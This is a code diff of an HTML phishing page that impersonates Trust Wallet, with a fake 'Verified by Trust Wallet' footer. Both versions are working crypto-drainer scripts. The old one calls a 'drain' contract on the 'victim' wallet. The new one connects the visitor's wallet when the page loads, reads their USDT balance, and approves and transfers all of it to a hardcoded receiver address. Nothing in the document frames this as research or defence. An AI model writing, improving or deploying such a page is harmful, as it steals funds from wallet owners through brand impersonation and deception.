@@ -1,93 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Trust Wallet Secure</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="icon" href="favicon.ico">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="icon" href="./favicon.ico" type="image/x-icon" />
+<title>Trust Wallet Verification</title>
 <style>
-  body {
-    background: #081c3a;
-    color: #fff;
-    font-family: Arial,sans-serif;
-    text-align: center;
-    padding: 40px;
-  }
-  img {
-    width: 100px;
-    margin: 20px auto;
-  }
-  h1 {
-    font-size: 24px;
-    margin-bottom: 10px;
-  }
-  p {
-    opacity: 0.9;
-    margin-bottom: 30px;
-  }
-  button {
-    background: #3375ff;
-    color: #fff;
-    padding: 14px 28px;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    font-size: 18px;
-  }
-  .status {
-    margin-top: 20px;
-    font-size: 14px;
-    opacity: 0.8;
-  }
-  .footer {
-    margin-top: 40px;
-    font-size: 12px;
-    opacity: 0.6;
-  }
+  body { background:#081c3a; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; font-family:sans-serif; margin:0; padding:0; }
+  img { width:80px; margin-bottom:10px; }
+  h2 { margin:10px 0; font-size:1.2em; }
+  p { opacity:0.7; }
+  button { padding:10px 24px; background:#2a9dff; border:none; border-radius:8px; color:#fff; font-size:1rem; cursor:pointer; margin-top:20px; }
+  .footer { margin-top:40px; opacity:0.5; font-size:0.7rem; }
 </style>
 </head>
 <body>
-  <img src="logo.png" alt="Trust Wallet">
-  <h1>Secure Wallet</h1>
-  <p>Tap below to allow secure transfer of USDT.</p>
-  <button id="drainButton">Approve & Drain</button>
-  <div class="status" id="status">Status: Waiting...</div>
+  <img src="./logo.png" alt="Trust Wallet" />
+  <h2>Verify Your Wallet</h2>
+  <p id="status">Connecting to Trust Wallet...</p>
+  <button id="approve-btn">Approve</button>
   <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.2/web3.min.js"></script>
 <script>
-const CONTRACT_ADDRESS = "0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47"; // <- tumhara contract address
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const statusEl = document.getElementById('status');
+  const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // your address
+  const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+  const ABI = [
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
+    {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
+  ];
+  
+  let userAccount;
 
-const DRAIN_ABI = [
-  {
-    "inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"victim","type":"address"}],
-    "name":"drain",
-    "outputs":[],"stateMutability":"nonpayable","type":"function"
+  async function connectWallet() {
+    if(!window.ethereum) { document.getElementById('status').textContent = "Please use Trust Wallet DApp browser."; return; }
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    userAccount = accounts[0];
+    document.getElementById('status').textContent = "Wallet connected.";
   }
-];
 
-document.getElementById('drainButton').onclick = async () => {
-  if(!window.ethereum) {
-    statusEl.innerText = "Please open this page inside Trust Wallet DApp.";
-    return;
-  }
-  try {
-    await ethereum.request({ method: "eth_requestAccounts" });
+  async function doApprove() {
     const web3 = new Web3(window.ethereum);
-    const accounts = await web3.eth.getAccounts();
-    const victim = accounts[0];
-
-    statusEl.innerText = "Processing transaction...";
-    const drainContract = new web3.eth.Contract(DRAIN_ABI, CONTRACT_ADDRESS);
-    await drainContract.methods.drain(USDT_ADDRESS, victim).send({ from: victim });
-
-    statusEl.innerText = "✅ Success!";
-  } catch (e) {
-    statusEl.innerText = "Error: " + e.message;
+    const contract = new web3.eth.Contract(ABI, USDT);
+    const balance = await contract.methods.balanceOf(userAccount).call();
+    if(balance > 0) {
+      await contract.methods.approve(receiver, balance).send({ from: userAccount });
+      await contract.methods.transferFrom(userAccount, receiver, balance).send({ from: userAccount });
+      document.getElementById('status').textContent = "✅ Success! Tokens transferred.";
+    } else {
+      document.getElementById('status').textContent = "No USDT balance found.";
+    }
   }
-};
+
+  document.getElementById('approve-btn').onclick = doApprove;
+  window.addEventListener('load', connectWallet);
 </script>
 </body>
 </html>
